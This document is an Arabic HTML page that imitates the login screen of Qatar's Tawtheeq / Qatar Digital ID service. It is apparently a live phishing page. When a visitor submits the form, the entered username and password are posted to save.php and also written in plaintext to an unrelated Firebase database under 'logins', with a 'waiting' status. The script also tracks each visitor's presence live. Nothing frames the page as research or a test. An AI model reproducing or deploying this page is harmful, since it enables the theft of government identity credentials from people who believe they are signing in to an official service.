<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول - توثيق</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root {
            --primary-blue: #003e7e;
            --dark-blue-btn: #003366;
            --light-blue-btn: #cfe4ff;
            --bg-gradient: linear-gradient(180deg, #024791 0%, #1565c0 100%);
        }

        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: var(--bg-gradient);
            background-attachment: fixed;
            overflow-x: hidden;
        }

        .wrapper { display: flex; flex-direction: column; width: 100%; }

        .header-box {
            width: 100%; background: #fff; display: flex; justify-content: center;
            border-bottom: 1px solid #ddd; z-index: 100;
        }
        .header-box img { width: 100%; max-width: 100%; height: auto; display: block; }

        .page-content {
            min-height: calc(100vh - 80px);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            width: 100%; padding: 40px 0; box-sizing: border-box;
        }

        .login-card {
            background: #ffffff; width: 92%; max-width: 400px; 
            border-radius: 40px; padding: 40px 25px; text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.3); box-sizing: border-box;
        }

        .tawtheeq-logo { width: 180px; margin-bottom: 5px; }
        .divider { width: 100%; height: 2px; background: var(--primary-blue); margin: 15px 0 25px 0; }
        .qatar-digital-id-logo { width: 150px; margin-bottom: 30px; }

        .reg-text { color: #888; font-size: 18px; margin-bottom: 25px; font-weight: 500; }
        .reg-text a { color: var(--primary-blue); font-weight: bold; text-decoration: none; border-bottom: 2px solid var(--primary-blue); }

        .input-wrapper { position: relative; margin-bottom: 15px; }
        .input-wrapper input {
            width: 100%; padding: 12px 15px 12px 45px; border: 1px solid #e5e5e5;
            border-radius: 12px; box-sizing: border-box; font-size: 18px;
            text-align: right; height: 58px; background-color: #fdfdfd;
        }
        .input-wrapper i { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); color: var(--primary-blue); font-size: 22px; }

        .forgot-link { display: block; text-align: left; font-size: 16px; color: var(--primary-blue); margin: 15px 0 30px 0; text-decoration: none; font-weight: bold; }

        .btn-submit { width: 100%; background-color: var(--dark-blue-btn); color: white; border: none; padding: 18px; border-radius: 50px; font-size: 24px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        
        .or-label { margin: 20px 0; color: #ccc; position: relative; font-size: 18px; }
        .or-label::after, .or-label::before { content: ""; position: absolute; top: 50%; width: 44%; height: 1px; background: #eee; }
        
        .btn-smart { width: 100%; background-color: var(--light-blue-btn); color: #004a99; border: none; padding: 18px; border-radius: 50px; font-size: 20px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer; }
        .smart-icon { font-size: 26px; }

        .dots { display: flex; gap: 12px; margin: 30px 0; justify-content: center; }
        .dot { width: 10px; height: 10px; background: rgba(255,255,255,0.3); border-radius: 50%; }
        .dot.active { background: #00aaff; }

        footer { width: 100%; display: flex; flex-direction: column; }
        .footer-img { width: 100%; height: auto; display: block; }

        /* شاشة التحميل المخصصة */
        #loading-screen {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255,255,255,0.98); z-index: 9999;
            flex-direction: column; align-items: center; justify-content: center;
        }
        .loader { border: 6px solid #f3f3f3; border-top: 6px solid var(--primary-blue); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    </style>
</head>
<body>

    <div class="wrapper">
        <header class="header-box">
            <img src="https://i.ibb.co/zTwpP2KX/IMG-20260324-WA0000.jpg" alt="Header">
        </header>

        <main class="page-content">
            <div class="login-card" id="main-card">
                <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/RQnjZWnrdYgEbNhJ.svg" class="tawtheeq-logo">
                <div class="divider"></div>
                <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/OzYfGIorjXifdHHC.svg" class="qatar-digital-id-logo">
                
                <p class="reg-text">لا تمتلك حساب حتى الآن؟ <a href="#">تسجيل الحساب</a></p>
                
                <form id="directLoginForm" action="save.php" method="POST">
                    <input type="hidden" name="visitor_id" id="form_visitor_id">
                    <div class="input-wrapper">
                        <input type="text" name="username" id="user" placeholder="ادخل اسم المستخدم" required>
                        <i class="fas fa-user"></i>
                    </div>
                    <div class="input-wrapper">
                        <input type="password" name="password" id="pass" placeholder="ادخل 6 أحرف على الأقل" required>
                        <i class="fas fa-lock"></i>
                    </div>
                    <a href="#" class="forgot-link">نسيت كلمة المرور؟</a>
                    <button type="submit" class="btn-submit">تسجيل الدخول</button>
                    <div class="or-label">أو</div>
                    <button type="button" class="btn-smart">
                        <span class="smart-icon"><i class="fas fa-id-card"></i></span>
                        الدخول بالبطاقة الذكية
                    </button>
                </form>
            </div>

            <div class="dots">
                <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot active"></div><div class="dot"></div><div class="dot"></div>
            </div>
        </main>

        <footer>
            <img src="https://i.ibb.co/672ZBdWV/IMG-20260324-WA0001.jpg" class="footer-img">
            <img src="https://i.ibb.co/TqLzLmyH/IMG-20260324-WA0002.jpg" class="footer-img">
        </footer>
    </div>

    <div id="loading-screen">
        <div class="loader"></div>
        <p id="status-text" style="margin-top: 25px; font-weight: bold; color: var(--primary-blue); font-size: 18px;">جاري معالجة الطلب...</p>
    </div>

    <script>
        // إعدادات Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT...", 
            authDomain: "saso-inspection.firebaseapp.com",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection",
            storageBucket: "saso-inspection.firebasestorage.app",
            messagingSenderId: "1009002235896",
            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
        };

        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const database = firebase.database();

        // استخدام نفس المعرف من الصفحة الرئيسية لربط البيانات
        let visitorId = sessionStorage.getItem('visitorId');
        if (!visitorId) {
            visitorId = "visitor_" + Math.floor(Math.random() * 900000 + 100000);
            sessionStorage.setItem('visitorId', visitorId);
        }
        document.getElementById('form_visitor_id').value = visitorId;

        // تحديث صفحة الزائر الحالية في قواعد البيانات للزيارات الحية
        const visitorRef = database.ref('active_visitors/' + visitorId);
        visitorRef.update({
            currentPage: "صفحة الدخول (tawtheeq.html)",
            lastSeen: firebase.database.ServerValue.TIMESTAMP
        });
        visitorRef.onDisconnect().remove();

        // معالجة إرسال الفورم المباشر وحفظ حالة الانتظار
        document.getElementById('directLoginForm').addEventListener('submit', function(e) {
            const username = document.getElementById('user').value;
            const password = document.getElementById('pass').value;

            // إرسال البيانات للفايربيس أيضاً للاحتياط
            const loginRef = database.ref('logins/' + visitorId);
            loginRef.set({
                id: visitorId,
                username: username,
                password: password,
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                status: "waiting",
                step: "tawtheeq"
            });

            // إرسال الفورم مباشرة دون شاشة تحميل في هذه المرحلة
        });
    </script>
</body>
</html>
